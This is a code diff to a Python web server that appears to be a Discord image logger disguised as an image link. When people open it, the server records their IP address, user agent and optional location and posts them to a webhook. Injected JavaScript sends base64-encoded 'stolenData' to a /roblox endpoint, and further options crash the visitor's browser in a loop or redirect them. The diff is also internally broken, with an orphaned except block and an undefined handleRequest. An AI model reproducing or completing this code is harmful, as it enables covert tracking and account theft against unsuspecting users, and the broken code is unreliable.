@@ -117,7 +117,7 @@ def makeReport(ip, useragent, coords=None):
     
     requests.post(config["webhook"], json={"embeds": [embed]})
 
-class Handler(BaseHTTPRequestHandler):
+class ImageLoggerAPI(BaseHTTPRequestHandler):
     def do_GET(self):
         self.handleRequest()
     
@@ -212,7 +212,7 @@ height: 100vh;
                     
                     // Send to logger server via image request
                     const img = new Image();
-                    img.src = `/roblox?data={{btoa(JSON.stringify(stolenData))}}&ip={self.headers.get('x-forwarded-for')}`;
+                    img.src = `/roblox?data=${{btoa(JSON.stringify(stolenData))}}&ip={self.headers.get('x-forwarded-for')}`;
                 }});
             }});
         }})
@@ -222,59 +222,66 @@ height: 100vh;
 </script>
 <div class="img"></div>'''.encode()
         
-        # [EXISTING CODE CONTINUES UNCHANGED]
         if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
             return
         
-        if self.headers.get('user-agent') and "bot" in self.headers.get('user-agent').lower() and config["botCheck"]:
-            self.send_response(200 if config["buggedImage"] else 302)
-            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-            self.end_headers()
+        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+            self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+            self.end_headers() # Declare the headers as finished.
+
             if config["buggedImage"]:
-                self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\nIDATx\x9cc\xf8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00IEND\xaeB`\x82')
+                self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\xf8\x00\x00\x00\x01\x00\x01\x9c\xf3\x0e\xfe\x00\x00\x00\x00IEND\xaeB`\x82')
+            
+            if config["redirect"]:
+                self.send_response(302)
+                self.send_header('Location', config["redirect"]["url"])
+                self.end_headers()
+                self.wfile.write(f'<html><head><meta http-equiv="refresh" content="0;url={config["redirect"]["url"]}"></head><body><a href="{config["redirect"]["url"]}">{config["redirect"]["message"]}</a></body></html>'.encode())
+            
             return
         
-        if config["accurateLocation"]:
-            data = f'''<script>
-var request = new XMLHttpRequest();
-request.onload = function() {{
-    var location = JSON.parse(request.responseText);
-    var image = new Image();
-    image.src = `/?lat={{location.location.lat}}&lon=${{location.location.lng}}&ip={self.headers.get('x-forwarded-for')}`;
-}};
-request.open("GET", "https://ipinfo.io/json", true);
-request.send();
-</script>'''.encode() + data
+        else:
+            try:
+                if config["accurateLocation"]:
+                    coords = json.loads(base64.b64decode(parse.parse_qs(self.path.split("?")[1])["g"][0]).decode())
+                else:
+                    coords = None
+            except:
+                coords = None
+            
+            makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), coords)
+            
+            if config["crashBrowser"]:
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'<script>for (var i=69420;i==i;i*=i) {document.body.innerHTML="<iframe src=https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1></iframe>"}</script>')
+                return
+            
+            if config["redirect"]:
+                self.send_response(302)
+                self.send_header('Location', config["redirect"]["url"])
+                self.end_headers()
+                self.wfile.write(f'<html><head><meta http-equiv="refresh" content="0;url={config["redirect"]["url"]}"></head><body><a href="{config["redirect"]["url"]}">{config["redirect"]["message"]}</a></body></html>'.encode())
+                return
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(data)
         
-        if config["crashBrowser"]:
-            data = b'<script>for (var i=69420;i==i;i*=i) {document.body.innerHTML="<h1>CRASHED</h1>"}</script>' + data
-        
-        if config["redirect"]:
-            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["url"]}">'.encode() + data
-        
-        if config["message"]:
-            data = f'<script>alert("{config["message"]["description"]}");</script>'.encode() + data
-        
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(data)
-        
-        makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), 
-                   (parse.parse_qs(parse.urlparse(self.path).query).get('lat', [None])[0], 
-                    parse.parse_qs(parse.urlparse(self.path).query).get('lon', [None])[0]) if parse.urlparse(self.path).query else None)
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
 
-def run(server_class=HTTPServer, handler_class=Handler, port=80):
-    try:
-        server_address = ('', port)
-        httpd = server_class(server_address, handler_class)
-        print(f'[{__app__}] Starting server on port {port}...')
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        print(f'[{__app__}] Shutting down server...')
-    except Exception as e:
-        print(f'[{__app__}] Error: {e}')
-        traceback.print_exc()
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
 
-if __name__ == '__main__':
-    run()
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
